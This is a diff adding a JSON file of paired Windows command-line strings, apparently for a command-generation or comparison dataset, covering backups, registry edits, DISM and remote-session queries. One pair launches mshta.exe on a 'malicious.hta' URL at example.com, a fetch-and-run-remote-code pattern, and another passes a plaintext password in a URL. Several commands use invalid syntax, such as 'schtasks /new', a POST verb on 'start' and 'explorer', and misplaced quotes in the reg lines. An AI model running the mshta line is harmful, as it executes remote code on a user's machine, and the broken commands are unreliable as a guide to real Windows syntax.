@@ -1,0 +1,30 @@
+[
+  [
+    "schtasks \/create \/tn \"DailyBackup\" \/tr \"robocopy C:\\Users\\JohnDoe\\Documents D:\\Backup \/E \/Z \/R:3 \/W:5\" \/sc daily \/st 02:00",
+    "schtasks \/new \/tn \"DailyBackup\" \/sc once \/sd 01\/01\/2000 \/st 02:00 \/tr \"robocopy \/E \/Z \/R:3 \/W:5 C:\\Users\\JohnDoe\\Documents D:\\Backup\" \/ri 1 \/du 9999:59 \/sd 01\/01\/2000 \/st 02:00 \/K"
+  ],
+  [
+    "start https:\/\/example.com\/securelogin -verb POST -data \"username=myuser&password=mypassword123\"",
+    "explorer \"https:\/\/example.com\/securelogin?username=myuser&password=mypassword123\" -method POST"
+  ],
+  [
+    "mshta.exe https:\/\/www.example.com\/malicious.hta",
+    "start mshta.exe \"https:\/\/www.example.com\/malicious.hta\""
+  ],
+  [
+    "\"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ParentalControl\\\\Username\" \/v StartTime\" \/t REG_DWORD \/d HourlyStartTimeOfDay\" \/f",
+    "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ParentalControls\\Username\" \/v \"StartTime\" \/t REG_DWORD \/d \"HourlyStartTime\" \/f\""
+  ],
+  [
+    "dism \/online \/enable-feature \/featurename:NetFx3 -Source:D:\\sources\\sxs\\",
+    "dism.exe \/online \/enable-feature \/featurename:NetFx3 \/Source:D:\\sources\\sxs"
+  ],
+  [
+    "query session \/server:remote_computer",
+    "query user \/server:remote_computer"
+  ],
+  [
+    "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server \/v fDenyTSConnections",
+    "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" \/v fDenyTSConnections"
+  ]
+]
